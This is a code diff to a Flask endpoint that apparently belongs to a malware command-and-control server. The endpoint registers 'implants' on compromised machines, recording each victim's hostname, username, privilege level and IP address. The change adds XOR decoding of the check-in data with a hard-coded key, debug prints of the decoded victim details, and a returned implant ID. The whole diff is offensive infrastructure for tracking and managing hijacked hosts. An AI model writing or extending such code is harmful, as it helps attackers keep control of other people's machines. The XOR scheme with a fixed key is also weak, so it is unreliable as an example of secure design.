@@ -40,18 +40,30 @@ class agents(Resource):
     def post(self):
 
         try:
-            data = request.get_data().decode().split(',,')
+            encrypted_data = request.get_data()
+            
+            key_str = "1234"
+            key = [ord(char) for char in key_str]
+            decrypted_data = ''.join(chr(byte ^ key[i % len(key)]) for i, byte in enumerate(encrypted_data))
+            print(decrypted_data)
+            
+            data = decrypted_data.split(',,')
             hostname = data[0]
+            print(hostname)
             username = data[1]
+            print(username)
             privilege = data[2]
+            print(privilege)
             ipaddress = request.remote_addr
+            print(ipaddress)
 
             conn = get_db_connection()
             cursor = conn.cursor()
             cursor.execute("INSERT INTO implants (implant_hostname, implant_username, ip_address) VALUES (?, ?, ?)", (hostname, username, ipaddress))
             conn.commit()
+            implant_id = cursor.lastrowid
             conn.close()
-            return 201
+            return implant_id, 201
 
         except Exception as e:
             return {"Error": str(e)}, 500
